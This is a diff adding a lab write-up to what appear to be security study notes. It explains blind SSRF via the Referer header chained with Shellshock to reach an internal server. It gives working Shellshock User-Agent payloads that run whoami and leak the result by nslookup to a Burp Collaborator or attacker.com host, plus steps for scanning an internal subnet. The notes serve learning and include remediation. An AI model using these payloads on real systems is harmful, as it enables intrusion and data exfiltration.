@@ -1676,3 +1676,832 @@ Reject:
 # 🔵 ONE-LINE SUMMARY
 
 👉 “This lab exploits SSRF by abusing URL parser confusion using embedded credentials and double-encoded fragments to bypass hostname whitelist validation and force the server to access localhost admin functionality.”
+
+---
+
+# 🧠Lab-7 Blind SSRF + Shellshock RCE via Referer Header
+
+---
+
+# 🔵 OVERVIEW
+
+This lab demonstrates an advanced attack chain involving:
+
+- Blind SSRF
+- Referer header abuse
+- Internal network access
+- Shellshock RCE
+- DNS exfiltration
+- Burp Collaborator interactions
+
+Final goal:
+
+👉 obtain the OS username from an internal server.
+
+---
+
+# 🔥 MAIN ATTACK CHAIN
+
+```text
+Blind SSRF
+      ↓
+Internal Server Access
+      ↓
+Shellshock Command Injection
+      ↓
+DNS Exfiltration
+      ↓
+OS Username Disclosure
+```
+
+---
+
+# 🔵 WHAT IS THE TOPIC?
+
+This lab combines multiple concepts together:
+
+| Concept | Meaning |
+|---|---|
+| SSRF | Server forced to make requests |
+| Blind SSRF | Response not directly visible |
+| Referer Abuse | Server fetches attacker-controlled Referer |
+| Shellshock | Bash command injection |
+| DNS Exfiltration | Data leaked through DNS |
+| Burp Collaborator | Listener for blind interactions |
+
+---
+
+# 🔵 THEORY SECTION
+
+# PART 1 — WHAT IS SSRF?
+
+---
+
+## SSRF Meaning
+
+SSRF means:
+
+```text
+Server-Side Request Forgery
+```
+
+Attacker tricks server into making requests
+on attacker’s behalf.
+
+---
+
+## Normal Flow
+
+```text
+Browser → Website → Public Resource
+```
+
+---
+
+## SSRF Flow
+
+```text
+Attacker controls URL
+        ↓
+Website requests attacker-chosen target
+        ↓
+Internal resources become accessible
+```
+
+---
+
+## Dangerous SSRF Targets
+
+| Target | Why Important |
+|---|---|
+| localhost | admin panels |
+| 127.0.0.1 | internal apps |
+| 192.168.x.x | private network |
+| AWS metadata | cloud credentials |
+| Redis/Jenkins | infrastructure takeover |
+
+---
+
+# PART 2 — WHAT IS BLIND SSRF?
+
+---
+
+## Normal SSRF
+
+Attacker sees response directly.
+
+Example:
+
+```text
+/admin HTML returned
+```
+
+---
+
+## Blind SSRF
+
+Server still makes request,
+BUT:
+
+❌ attacker cannot see response directly.
+
+Only indirect evidence exists.
+
+---
+
+## How Attackers Detect Blind SSRF
+
+Using:
+
+- DNS callbacks
+- HTTP callbacks
+- Burp Collaborator
+
+---
+
+# PART 3 — WHAT IS REFERER HEADER?
+
+Example:
+
+```http
+GET /product
+Referer: https://google.com
+```
+
+---
+
+## Meaning
+
+Referer tells server:
+
+👉 where visitor came from.
+
+---
+
+## Why Websites Use Referer
+
+Analytics systems use it for:
+
+- visitor tracking
+- URL logging
+- analytics
+- crawling pages
+
+---
+
+## Vulnerability In This Lab
+
+Analytics software:
+
+```text
+automatically fetches Referer URL server-side
+```
+
+Meaning:
+
+attacker controls
+server-side request destination.
+
+💥 SSRF achieved.
+
+---
+
+# PART 4 — INTERNAL NETWORK THEORY
+
+Lab target:
+
+```text
+192.168.0.X:8080
+```
+
+---
+
+## What Is 192.168.x.x?
+
+Private internal IP range.
+
+Accessible only:
+
+✅ inside organization network
+
+❌ not directly from internet
+
+---
+
+## Meaning
+
+There is:
+
+👉 hidden internal infrastructure.
+
+---
+
+# PART 5 — WHAT IS SHELLSHOCK?
+
+Shellshock is:
+
+👉 Bash command injection vulnerability.
+
+Common in:
+
+- legacy CGI applications
+- old Bash environments
+
+---
+
+## Why It Happens
+
+Some CGI applications convert:
+
+- User-Agent
+- Referer
+- Cookies
+
+into:
+
+👉 Bash environment variables.
+
+---
+
+## Result
+
+Attacker-controlled headers become:
+
+💥 command execution.
+
+---
+
+# SHELLSHOCK PAYLOAD STRUCTURE
+
+```bash
+() { :; }; command
+```
+
+---
+
+## Meaning
+
+| Part | Purpose |
+|---|---|
+| () { :; }; | malicious Bash function |
+| command | command executed |
+
+---
+
+## Example
+
+```bash
+() { :; }; whoami
+```
+
+If vulnerable:
+
+```text
+server executes whoami
+```
+
+---
+
+# PART 6 — DNS EXFILTRATION
+
+This lab is:
+
+👉 blind.
+
+So attacker cannot directly view command output.
+
+---
+
+## Solution
+
+Leak data through:
+
+- DNS requests
+- Burp Collaborator
+
+---
+
+## Example Payload
+
+```bash
+nslookup $(whoami).attacker.com
+```
+
+---
+
+## What Happens?
+
+If username is:
+
+```text
+carlos
+```
+
+Server executes:
+
+```bash
+nslookup carlos.attacker.com
+```
+
+Attacker sees:
+
+```text
+carlos.attacker.com
+```
+
+inside DNS logs.
+
+---
+
+# PART 7 — WHAT IS BURP COLLABORATOR?
+
+Collaborator is:
+
+👉 Burp-controlled listener server.
+
+Used to detect:
+
+- Blind SSRF
+- Blind XXE
+- Blind RCE
+- DNS callbacks
+
+---
+
+# IMPORTANT MENTAL MODEL
+
+If target system contacts:
+
+```text
+your collaborator domain
+```
+
+then:
+
+✅ payload executed successfully.
+
+---
+
+# 🔵 LAB WALKTHROUGH (STEP-BY-STEP)
+
+---
+
+## ✅ Step 1 — Install Collaborator Everywhere
+
+Install extension:
+
+```text
+Collaborator Everywhere
+```
+
+Purpose:
+
+automatically inject collaborator payloads into requests.
+
+---
+
+## ✅ Step 2 — Add Lab To Scope
+
+Add lab domain into:
+
+```text
+Target Scope
+```
+
+so extension targets lab only.
+
+---
+
+## ✅ Step 3 — Browse Product Page
+
+Open any product page.
+
+---
+
+## What Happens Internally?
+
+Analytics software:
+
+```text
+reads Referer header
+        ↓
+fetches Referer URL server-side
+```
+
+---
+
+## Result
+
+Collaborator receives interaction.
+
+Meaning:
+
+💥 Blind SSRF exists.
+
+---
+
+# IMPORTANT DISCOVERY
+
+Collaborator interaction includes:
+
+```text
+User-Agent header
+```
+
+Huge clue.
+
+---
+
+## Meaning
+
+Internal server receives:
+
+👉 attacker-controlled User-Agent.
+
+Possible Shellshock target.
+
+---
+
+## ✅ Step 4 — Send Request To Intruder
+
+Send product request into:
+
+```text
+Burp Intruder
+```
+
+---
+
+## Goal
+
+Scan:
+
+```text
+192.168.0.1 → 192.168.0.255
+```
+
+for vulnerable internal server.
+
+---
+
+## ✅ Step 5 — Generate Collaborator Payload
+
+Generate unique Collaborator domain.
+
+Example:
+
+```text
+abcd1234.burpcollaborator.net
+```
+
+---
+
+## ✅ Step 6 — Build Shellshock Payload
+
+```bash
+() { :; }; /usr/bin/nslookup $(whoami).abcd1234.burpcollaborator.net
+```
+
+---
+
+# PAYLOAD BREAKDOWN
+
+| Part | Meaning |
+|---|---|
+| () { :; }; | trigger Shellshock |
+| nslookup | generate DNS request |
+| $(whoami) | retrieve OS username |
+| collaborator domain | exfiltrate result |
+
+---
+
+## ✅ Step 7 — Replace User-Agent Header
+
+Set:
+
+```http
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).abcd1234.burpcollaborator.net
+```
+
+---
+
+## Why User-Agent?
+
+Because CGI applications often pass headers into:
+
+```text
+Bash environment variables
+```
+
+---
+
+## ✅ Step 8 — Change Referer Header
+
+Set:
+
+```http
+Referer: http://192.168.0.1:8080
+```
+
+---
+
+## Meaning
+
+Analytics software now visits:
+
+👉 internal machine.
+
+---
+
+## ✅ Step 9 — Add Payload Position
+
+Highlight:
+
+```text
+1
+```
+
+inside:
+
+```text
+192.168.0.1
+```
+
+Then click:
+
+```text
+Add §
+```
+
+---
+
+## Meaning
+
+Intruder brute-forces:
+
+```text
+192.168.0.1 → 192.168.0.255
+```
+
+---
+
+## ✅ Step 10 — Configure Number Payload
+
+| Setting | Value |
+|---|---|
+| From | 1 |
+| To | 255 |
+| Step | 1 |
+
+---
+
+## Result
+
+Entire internal subnet scanned.
+
+---
+
+## ✅ Step 11 — Start Attack
+
+Intruder sends requests.
+
+Each request triggers:
+
+```text
+analytics SSRF request
+        ↓
+internal host receives User-Agent
+```
+
+---
+
+## If Host Is Vulnerable
+
+Shellshock executes:
+
+```bash
+nslookup $(whoami).abcd1234.burpcollaborator.net
+```
+
+---
+
+## ✅ Step 12 — Poll Collaborator
+
+Go to:
+
+```text
+Collaborator tab
+```
+
+Click:
+
+```text
+Poll now
+```
+
+---
+
+## Result
+
+DNS interaction appears:
+
+```text
+carlos.abcd1234.burpcollaborator.net
+```
+
+---
+
+## Meaning
+
+| Part | Meaning |
+|---|---|
+| carlos | OS username |
+| collaborator domain | attacker listener |
+
+💥 Lab solved.
+
+---
+
+# 🔵 FINAL PAYLOADS
+
+## User-Agent Payload
+
+```bash
+() { :; }; /usr/bin/nslookup $(whoami).YOUR-COLLABORATOR-ID.burpcollaborator.net
+```
+
+---
+
+## Referer Payload
+
+```text
+http://192.168.0.§:8080
+```
+
+---
+
+# 🔵 EXECUTION FLOW (VERY IMPORTANT)
+
+```text
+Attacker loads product page
+        ↓
+Analytics software reads Referer
+        ↓
+Analytics system visits internal IP
+        ↓
+Internal server receives malicious User-Agent
+        ↓
+Shellshock vulnerability triggers
+        ↓
+Server executes nslookup $(whoami)
+        ↓
+DNS request reaches Collaborator
+        ↓
+Attacker learns OS username
+```
+
+---
+
+# 🔵 REAL-WORLD SCENARIOS
+
+---
+
+## 📊 Analytics Systems
+
+Analytics crawlers fetching attacker-controlled URLs.
+
+---
+
+## 🛠 Internal Monitoring Services
+
+Internal scanners vulnerable to SSRF.
+
+---
+
+## 💥 Legacy CGI Infrastructure
+
+Old Bash CGI applications vulnerable to Shellshock.
+
+---
+
+## ☁️ Cloud Infrastructure
+
+Blind SSRF reaching:
+
+- metadata endpoints
+- internal APIs
+- admin panels
+
+---
+
+## ⚙️ CI/CD Systems
+
+Internal Jenkins/GitLab services exposed internally.
+
+---
+
+# 🔵 HIGH-VALUE TARGETS
+
+| Target | Why Valuable |
+|---|---|
+| 127.0.0.1 | localhost admin |
+| 192.168.x.x | internal systems |
+| 169.254.169.254 | AWS metadata |
+| Jenkins | CI/CD compromise |
+| Redis | database abuse |
+| Docker API | container escape |
+
+---
+
+# 🔵 HIGH-VALUE HEADERS
+
+Commonly abused headers:
+
+```text
+User-Agent
+Referer
+X-Forwarded-For
+Cookie
+```
+
+---
+
+# 🔵 REMEDIATION
+
+---
+
+## Disable Dangerous Fetching
+
+Analytics systems should:
+
+❌ never fetch arbitrary Referer URLs.
+
+---
+
+## SSRF Protections
+
+Block access to:
+
+- localhost
+- internal IP ranges
+- metadata endpoints
+- private networks
+
+---
+
+## Remove Shellshock Exposure
+
+Update:
+
+- Bash
+- CGI environments
+
+Remove vulnerable CGI scripts.
+
+---
+
+## Sanitize Headers
+
+Never pass headers directly into:
+
+```text
+shell commands
+```
+
+---
+
+## Network Segmentation
+
+Internal systems should not trust:
+
+👉 internal traffic automatically.
+
+---
+
+# 🔵 IMPORTANT MENTAL MODEL
+
+This lab uses:
+
+```text
+Blind SSRF
+```
+
+as delivery mechanism
+to reach:
+
+```text
+internal Shellshock-vulnerable server
+```
+
+Then:
+
+```text
+RCE leaks data using DNS callbacks
+through Burp Collaborator
+```
+
+---
+
+# 🔵 ONE-LINE SUMMARY
+
+👉 “Blind SSRF abused analytics software that fetched attacker-controlled Referer URLs, allowing Shellshock command execution on an internal server and exfiltration of the OS username through Burp Collaborator DNS callbacks.”
